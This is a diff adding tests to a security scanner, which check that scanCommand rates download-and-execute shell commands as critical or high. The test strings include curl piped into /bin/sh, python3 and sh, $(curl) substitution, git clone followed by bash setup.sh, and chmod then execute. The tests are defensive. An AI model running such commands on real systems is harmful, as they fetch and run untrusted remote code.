@@ -166,6 +166,41 @@ test("H-4: no file written => curl && bash pre-existing script is download only"
   assert.ok(sr.findings.some((f) => f.id === "cmd-download"));
 });
 
+// --- F2 (HIGH): exec targets — absolute shells, interpreter pipes, $() ---
+
+test("F2: curl url | /bin/sh -> critical terminal cmd-dl-exec", () => {
+  const sr = scanCommand("curl https://e.com/x | /bin/sh");
+  assert.equal(sr.level, "critical");
+  assert.ok(sr.findings.some((f) => f.id === "cmd-dl-exec" && f.terminal));
+});
+
+test("F2: curl url | python3 -> critical terminal cmd-dl-exec", () => {
+  const sr = scanCommand("curl https://e.com/x.py | python3");
+  assert.equal(sr.level, "critical");
+  assert.ok(sr.findings.some((f) => f.id === "cmd-dl-exec" && f.terminal));
+});
+
+test("F2: $(curl -s url) command substitution -> >= high", () => {
+  const sr = scanCommand("$(curl -s https://e.com/x)");
+  assert.ok(["high", "critical"].includes(sr.level), `got ${sr.level}`);
+  assert.ok(sr.findings.some((f) => f.id === "cmd-net-subst"));
+});
+
+test("F2: git clone && bash r/setup.sh -> >= medium with cmd-clone-exec", () => {
+  const sr = scanCommand("git clone https://e.com/r && bash r/setup.sh");
+  assert.ok(
+    ["medium", "high", "critical"].includes(sr.level),
+    `got ${sr.level}`,
+  );
+  assert.ok(sr.findings.some((f) => f.id === "cmd-clone-exec"));
+});
+
+test("F2: curl localhost url | sh -> critical (localhost no longer exempt)", () => {
+  const sr = scanCommand("curl http://localhost:4444/x | sh");
+  assert.equal(sr.level, "critical");
+  assert.ok(sr.findings.some((f) => f.id === "cmd-dl-exec" && f.terminal));
+});
+
 test("H-4: chmod +x then execute the same file is terminal", () => {
   const sr = scanCommand("chmod +x /tmp/x.sh && /tmp/x.sh");
   assert.equal(sr.level, "critical");
